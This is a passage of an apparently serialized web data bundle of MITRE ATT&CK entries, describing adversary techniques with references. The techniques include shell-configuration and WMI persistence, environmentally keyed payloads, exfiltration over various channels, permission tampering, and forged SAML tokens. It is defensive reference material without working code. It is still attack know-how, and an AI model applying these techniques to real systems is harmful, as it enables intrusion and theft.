\u003Ccode\u003E\u002Fetc\u002Fzlogin\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fscriptingosx.com\u002F2019\u002F06\u002Fmoving-to-zsh-part-2-configuration-files\u002F'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fposts.specterops.io\u002Fpersistent-jxa-66e1c3cd1cf5'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FD00MFist\u002FPersistentJXA\u002Fblob\u002Fmaster\u002FBashProfilePersist.js'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The login shell then configures the user environment with \u003Ccode\u003E~\u002F.zprofile\u003C\u002Fcode\u003E and \u003Ccode\u003E~\u002F.zlogin\u003C\u002Fcode\u003E. The interactive shell uses the \u003Ccode\u003E~\u002F.zshrc\u003C\u002Fcode\u003E to configure the user environment. Upon exiting, \u003Ccode\u003E\u002Fetc\u002Fzlogout\u003C\u002Fcode\u003E and \u003Ccode\u003E~\u002F.zlogout\u003C\u002Fcode\u003E are executed. For legacy programs, macOS executes \u003Ccode\u003E\u002Fetc\u002Fbashrc\u003C\u002Fcode\u003E on startup.";sc.external_references=[{source_name:b,external_id:sd,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F004"},{source_name:lh,url:li,description:lj},{source_name:"bencane blog bashrc",url:"https:\u002F\u002Fbencane.com\u002F2013\u002F09\u002F16\u002Funderstanding-a-little-more-about-etcprofile-and-etcbashrc\u002F",description:"Benjamin Cane. (2013, September 16). Understanding a little more about \u002Fetc\u002Fprofile and \u002Fetc\u002Fbashrc. Retrieved February 25, 2021."},{source_name:"anomali-rocke-tactics",url:"https:\u002F\u002Fwww.anomali.com\u002Fblog\u002Fillicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect",description:"Anomali Threat Research. (2019, October 15). Illicit Cryptomining Threat Actor Rocke Changes Tactics, Now More Difficult to Detect. Retrieved December 17, 2020."},{source_name:"Linux manual bash invocation",url:"https:\u002F\u002Fwiki.archlinux.org\u002Findex.php\u002FBash#Invocation",description:"ArchWiki. (2021, January 19). Bash. Retrieved February 25, 2021."},{source_name:"Tsunami",url:"https:\u002F\u002Funit42.paloaltonetworks.com\u002Funit42-new-iotlinux-malware-targets-dvrs-forms-botnet\u002F",description:"Claud Xiao and Cong Zheng. (2017, April 6). New IoT\u002FLinux Malware Targets DVRs, Forms Botnet. Retrieved December 17, 2020."},{source_name:"anomali-linux-rabbit",url:"https:\u002F\u002Fwww.anomali.com\u002Fblog\u002Fpulling-linux-rabbit-rabbot-malware-out-of-a-hat",description:"Anomali Threat Research. (2018, December 6). Pulling Linux Rabbit\u002FRabbot Malware Out of a Hat. Retrieved December 17, 2020."},{source_name:"Magento",url:"https:\u002F\u002Fblog.sucuri.net\u002F2018\u002F05\u002Fshell-logins-as-a-magento-reinfection-vector.html",description:"Cesar Anjos. (2018, May 31). Shell Logins as a Magento Reinfection Vector. Retrieved December 17, 2020."},{source_name:"ScriptingOSX zsh",url:"https:\u002F\u002Fscriptingosx.com\u002F2019\u002F06\u002Fmoving-to-zsh-part-2-configuration-files\u002F",description:"Armin Briegel. (2019, June 5). Moving to zsh, part 2: Configuration Files. Retrieved February 25, 2021."},{source_name:"PersistentJXA_leopitt",url:lY,description:"Leo Pitt. (2020, August 6). Persistent JXA - A poor man's Powershell for macOS. Retrieved January 11, 2021."},{source_name:"code_persistence_zsh",url:"https:\u002F\u002Fgithub.com\u002FD00MFist\u002FPersistentJXA\u002Fblob\u002Fmaster\u002FBashProfilePersist.js",description:"Leo Pitt. (2020, November 11). Github - PersistentJXA\u002FBashProfilePersist.js. Retrieved January 11, 2021."},{source_name:"ESF_filemonitor",url:"https:\u002F\u002Fobjective-see.com\u002Fblog\u002Fblog_0x48.html",description:"Patrick Wardle. (2019, September 17). Writing a File Monitor with Apple's Endpoint Security Framework. Retrieved December 17, 2020."}];sc["subtechnique-of"]=s;se.id=sf;se["object-type"]=a;se.name="Windows Management Instrumentation Event Subscription";se.description="Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww2.fireeye.com\u002Frs\u002Ffireye\u002Fimages\u002Frpt-m-trends-2015.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fsans-dfir-2015.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fglobal\u002Fen\u002Fcurrent-threats\u002Fpdfs\u002Fwp-windows-management-instrumentation.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.secureworks.com\u002Fblog\u002Fwmi-persistence'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fwmisdk\u002Fmanaged-object-format--mof-'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.";se.external_references=[{source_name:b,external_id:sf,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F003"},{url:"https:\u002F\u002Fwww2.fireeye.com\u002Frs\u002Ffireye\u002Fimages\u002Frpt-m-trends-2015.pdf",description:"Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016.",source_name:"Mandiant M-Trends 2015"},{source_name:sg,url:sh,description:si},{url:fp,description:fq,source_name:fr},{url:"https:\u002F\u002Fwww.secureworks.com\u002Fblog\u002Fwmi-persistence",description:"Dell SecureWorks Counter Threat Unit™ (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016.",source_name:"Dell WMI Persistence"},{source_name:"Microsoft MOF May 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fwmisdk\u002Fmanaged-object-format--mof-",description:"Satran, M. (2018, May 30). Managed Object Format (MOF). Retrieved January 24, 2020."},{url:y,description:z,source_name:A},{description:sj,url:sk,source_name:sl},{source_name:j_,url:j$,description:ka},{source_name:"Microsoft Register-WmiEvent",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmicrosoft.powershell.management\u002Fregister-wmievent?view=powershell-5.1",description:"Microsoft. (n.d.). Retrieved January 24, 2020."}];se["subtechnique-of"]=s;sm.id=sn;sm["object-type"]=a;sm.name="Environmental Keying";sm.description="Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1480'\u003EExecution Guardrails\u003C\u002Fa\u003E that utilizes cryptographic techniques for deriving encryption\u002Fdecryption keys from specific types of values in a given computing environment.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.schneier.com\u002Facademic\u002Fpaperfiles\u002Fpaper-clueless-agents.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software\u002Fsoftware versions, files, joined AD domains, system time, and local\u002Fexternal IP addresses.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F20134940\u002Fkaspersky-lab-gauss.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.proofpoint.com\u002Fus\u002Fthreat-insight\u002Fpost\u002Fhome-routers-under-attack-malvertising-windows-android-devices'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpdfs.semanticscholar.org\u002F2721\u002F3d206bc3c1e8c229fb4820b6af09e7f975da.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearch.nccgroup.com\u002F2017\u002F08\u002F08\u002Fsmuggling-hta-files-in-internet-explorer-edge\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FGenetic-Malware\u002FEbowla\u002Fblob\u002Fmaster\u002FEko_2016_Morrow_Pitts_Master.pdf'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F20134940\u002Fkaspersky-lab-gauss.pdf'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FGenetic-Malware\u002FEbowla\u002Fblob\u002Fmaster\u002FEko_2016_Morrow_Pitts_Master.pdf'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1027'\u003EObfuscated Files or Information\u003C\u002Fa\u003E, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F20134940\u002Fkaspersky-lab-gauss.pdf'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpdfs.semanticscholar.org\u002F2721\u002F3d206bc3c1e8c229fb4820b6af09e7f975da.pdf'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearch.nccgroup.com\u002F2017\u002F08\u002F08\u002Fsmuggling-hta-files-in-internet-explorer-edge\u002F'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FGenetic-Malware\u002FEbowla\u002Fblob\u002Fmaster\u002FEko_2016_Morrow_Pitts_Master.pdf'\u003E[12]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fnccgroup\u002Fdemiguise\u002Fblob\u002Fmaster\u002Fexamples\u002Fvirginkey.js'\u003E[13]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F20134940\u002Fkaspersky-lab-gauss.pdf'\u003E[14]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1480'\u003EExecution Guardrails\u003C\u002Fa\u003E, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497'\u003EVirtualization\u002FSandbox Evasion\u003C\u002Fa\u003E. While use of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497'\u003EVirtualization\u002FSandbox Evasion\u003C\u002Fa\u003E may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.";sm.external_references=[{source_name:b,external_id:sn,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1480\u002F001"},{source_name:"EK Clueless Agents",url:"https:\u002F\u002Fwww.schneier.com\u002Facademic\u002Fpaperfiles\u002Fpaper-clueless-agents.pdf",description:"Riordan, J., Schneier, B. (1998, June 18). Environmental Key Generation towards Clueless Agents. Retrieved January 18, 2019."},{source_name:"Kaspersky Gauss Whitepaper",url:"https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F20134940\u002Fkaspersky-lab-gauss.pdf",description:"Kaspersky Lab. (2012, August). Gauss: Abnormal Distribution. Retrieved January 17, 2019."},{source_name:"Proofpoint Router Malvertising",url:"https:\u002F\u002Fwww.proofpoint.com\u002Fus\u002Fthreat-insight\u002Fpost\u002Fhome-routers-under-attack-malvertising-windows-android-devices",description:"Kafeine. (2016, December 13). Home Routers Under Attack via Malvertising on Windows, Android Devices. Retrieved January 16, 2019."},{source_name:"EK Impeding Malware Analysis",url:"https:\u002F\u002Fpdfs.semanticscholar.org\u002F2721\u002F3d206bc3c1e8c229fb4820b6af09e7f975da.pdf",description:"Song, C., et al. (2012, August 7). Impeding Automated Malware Analysis with Environment-sensitive Malware. Retrieved January 18, 2019."},{source_name:"Environmental Keyed HTA",url:"https:\u002F\u002Fresearch.nccgroup.com\u002F2017\u002F08\u002F08\u002Fsmuggling-hta-files-in-internet-explorer-edge\u002F",description:"Warren, R. (2017, August 8). Smuggling HTA files in Internet Explorer\u002FEdge. Retrieved January 16, 2019."},{source_name:"Ebowla: Genetic Malware",url:"https:\u002F\u002Fgithub.com\u002FGenetic-Malware\u002FEbowla\u002Fblob\u002Fmaster\u002FEko_2016_Morrow_Pitts_Master.pdf",description:"Morrow, T., Pitts, J. (2016, October 28). Genetic Malware: Designing Payloads for Specific Targets. Retrieved January 18, 2019."},{source_name:"Demiguise Guardrail Router Logo",url:"https:\u002F\u002Fgithub.com\u002Fnccgroup\u002Fdemiguise\u002Fblob\u002Fmaster\u002Fexamples\u002Fvirginkey.js",description:"Warren, R. (2017, August 2). Demiguise: virginkey.js. Retrieved January 17, 2019."}];sm["subtechnique-of"]=fs;so.id=sp;so["object-type"]=a;so.name="Exfiltration Over Asymmetric Encrypted Non-C2 Protocol";so.description="Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt\u002Fdecrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS\u002FTLS\u002FSSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ";so.external_references=[{source_name:b,external_id:sp,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1048\u002F002"},{url:f,description:g,source_name:h}];so["subtechnique-of"]=bB;sq.id=sr;sq["object-type"]=a;sq.name="Exfiltration Over Symmetric Encrypted Non-C2 Protocol";sq.description="Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys\u002Fsecrets on each end of the channel. This requires an exchange or pre-arranged agreement\u002Fpossession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ";sq.external_references=[{source_name:b,external_id:sr,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1048\u002F001"},{url:f,description:g,source_name:h}];sq["subtechnique-of"]=bB;ss.id=st;ss["object-type"]=a;ss.name="Exfiltration Over Unencrypted\u002FObfuscated Non-C2 Protocol";ss.description="Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding\u002Fcompression algorithms (such as base64) as well as embedding data within protocol headers and fields. ";ss.external_references=[{source_name:b,external_id:st,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1048\u002F003"},{url:f,description:g,source_name:h}];ss["subtechnique-of"]=bB;sv.id=sw;sv["object-type"]=a;sv.name="Exfiltration Over Bluetooth";sv.description="Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an attacker may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.";sv.external_references=[{source_name:b,external_id:sw,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1011\u002F001"}];sv["subtechnique-of"]=ft;sx.id=sy;sx["object-type"]=a;sx.name="Exfiltration over USB";sx.description="Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.";sx.external_references=[{source_name:b,external_id:sy,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1052\u002F001"}];sx["subtechnique-of"]=fu;sz.id=sA;sz["object-type"]=a;sz.name="Exfiltration to Cloud Storage";sz.description="Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ";sz.external_references=[{source_name:b,external_id:sA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1567\u002F002"}];sz["subtechnique-of"]=cM;sB.id=sC;sB["object-type"]=a;sB.name="Exfiltration to Code Repository";sB.description="Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https:\u002F\u002Fapi.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ";sB.external_references=[{source_name:b,external_id:sC,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1567\u002F001"}];sB["subtechnique-of"]=cM;tf.id=tg;tf["object-type"]=a;tf.name="Linux and Mac File and Directory Permissions Modification";tf.description="Adversaries may modify file or directory permissions\u002Fattributes to evade access control lists (ACLs) and access protected files.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.hybrid-analysis.com\u002Fsample\u002Fef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.hybrid-analysis.com\u002Fsample\u002F22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: \u003Ccode\u003Echown\u003C\u002Fcode\u003E (short for change owner), and \u003Ccode\u003Echmod\u003C\u002Fcode\u003E (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F004'\u003EUnix Shell Configuration Modification\u003C\u002Fa\u003E or tainting\u002Fhijacking other instrumental binary\u002Fconfiguration files via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574'\u003EHijack Execution Flow\u003C\u002Fa\u003E.";tf.external_references=[{source_name:b,external_id:tg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1222\u002F002"},{url:fy,description:fz,source_name:fA},{url:fB,description:fC,source_name:fD}];tf["subtechnique-of"]=cQ;th.id=ti;th["object-type"]=a;th.name="Windows File and Directory Permissions Modification";th.description="Adversaries may modify file or directory permissions\u002Fattributes to evade access control lists (ACLs) and access protected files.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.hybrid-analysis.com\u002Fsample\u002Fef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.hybrid-analysis.com\u002Fsample\u002F22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fdesktop\u002Fsecauthz\u002Fdacls-and-aces'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fsecauthz\u002Faccess-control-lists'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F008'\u003EAccessibility Features\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1037'\u003EBoot or Logon Initialization Scripts\u003C\u002Fa\u003E, or tainting\u002Fhijacking other instrumental binary\u002Fconfiguration files via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574'\u003EHijack Execution Flow\u003C\u002Fa\u003E.";th.external_references=[{source_name:b,external_id:ti,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1222\u002F001"},{url:fy,description:fz,source_name:fA},{url:fB,description:fC,source_name:fD},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fdesktop\u002Fsecauthz\u002Fdacls-and-aces",description:"Microsoft. (2018, May 30). DACLs and ACEs. Retrieved August 19, 2018.",source_name:"Microsoft DACL May 2018"},{source_name:"Microsoft Access Control Lists May 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fsecauthz\u002Faccess-control-lists",description:"M. Satran, M. Jacobs. (2018, May 30). Access Control Lists. Retrieved February 4, 2020."},{url:tc,description:td,source_name:te}];th["subtechnique-of"]=cQ;tq.id=tr;tq["object-type"]=a;tq.name="SAML Tokens";tq.description="An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.microsoft.com\u002Fon-the-issues\u002F2020\u002F12\u002F13\u002Fcustomers-protect-nation-state-cyberattacks\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The default lifetime of a SAML token is one hour, but the validity period can be specified in the \u003Ccode\u003ENotOnOrAfter\u003C\u002Fcode\u003E value of the \u003Ccode\u003Econditions ...\u003C\u002Fcode\u003E element in a token. This value can be changed using the \u003Ccode\u003EAccessTokenLifetime\u003C\u002Fcode\u003E in a \u003Ccode\u003ELifetimeTokenPolicy\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Factive-directory-configurable-token-lifetimes'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cyberark.com\u002Fresources\u002Fthreat-research-blog\u002Fgolden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn adversary may utilize \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F004'\u003EPrivate Keys\u003C\u002Fa\u003E to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsrc-blog.microsoft.com\u002F2020\u002F12\u002F13\u002Fcustomer-guidance-on-recent-nation-state-cyber-attacks\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This differs from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1528'\u003ESteal Application Access Token\u003C\u002Fa\u003E and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550'\u003EUse Alternate Authentication Material\u003C\u002Fa\u003E, which may bypass multi-factor and other authentication protection mechanisms.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsrc-blog.microsoft.com\u002F2020\u002F12\u002F13\u002Fcustomer-guidance-on-recent-nation-state-cyber-attacks\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";tq.external_references=[{source_name:b,external_id:tr,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1606\u002F002"},{source_name:"Microsoft SolarWinds Steps",url:"https:\u002F\u002Fblogs.microsoft.com\u002Fon-the-issues\u002F2020\u002F12\u002F13\u002Fcustomers-protect-nation-state-cyberattacks\u002F",description:"Lambert, J. (2020, December 13). Important steps for customers to protect themselves from recent nation-state cyberattacks. Retrieved December 17, 2020."},{source_name:"Microsoft SAML Token Lifetimes",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Factive-directory-configurable-token-lifetimes",description:"Microsoft. (2020, December 14). Configurable token lifetimes in Microsoft Identity Platform. Retrieved December 22, 2020."},{source_name:"Cyberark Golden SAML",url:"https:\u002F\u002Fwww.cyberark.com\u002Fresources\u002Fthreat-research-blog\u002Fgolden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps",description:"Reiner, S. (2017, November 21). Golden SAML: Newly Discovered Attack Technique Forges Authentication to Cloud Apps. Retrieved December 17, 2020."},{source_name:dR,url:ch,description:dS},{source_name:fm,url:fn,description:fo}];tq["subtechnique-of"]=cR;ts.id=tt;ts["object-type"]=a;ts.name="Web Cookies";ts.description="Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to 